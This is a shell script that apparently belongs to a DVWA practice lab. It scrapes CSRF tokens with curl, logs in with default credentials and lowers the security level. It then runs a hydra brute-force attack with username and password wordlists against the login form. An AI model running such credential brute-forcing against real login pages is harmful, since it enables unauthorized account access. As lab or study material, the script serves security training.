#Connect to the actual page for brute force
# curl -s -i -L 192.168.178.98/dvwa/vulnerabilities/brute/  > vuln
#
#Login with the found login
CSRF=$(curl -s -c dvwa.cookie 192.168.178.98/dvwa/login.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
curl -s -i -L -b dvwa.cookie -d $"username=admin&password=password&Login=Login&user_token=${CSRF}" 192.168.178.98/dvwa/login.php > /dev/null
#Change the security level to low (impossible by default)
CSRFSEC=$(curl -s -i -L -c dvwa.cookie.low -b dvwa.cookie 192.168.178.98/dvwa/security.php | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONIDSEC=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')
curl -s -i -L -b dvwa.cookie.low -c dvwa.cookie.low -d $"security=low&seclev_submit=Submit&user_token=${CSRFSEC}" 192.168.178.98/dvwa/security.php > /dev/null
#Check out the "bruteforce" page
curl -s -i -L -b dvwa.cookie.low 192.168.178.98/dvwa/vulnerabilities/brute/ > /dev/null
#Send our known login
rm hydra.restore
hydra -L /Users/NTAuthority/Desktop/SecLists/Usernames/top_shortlist.txt  -P /Users/NTAuthority/Desktop/SecLists/Passwords/500-worst-passwords.txt -t 64 -u -F -t 1 -w 10 -W 1 -V 192.168.178.98 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:S=Welcome:H=Cookie\: security=low; PHPSESSID=${SESSIONIDSEC}"
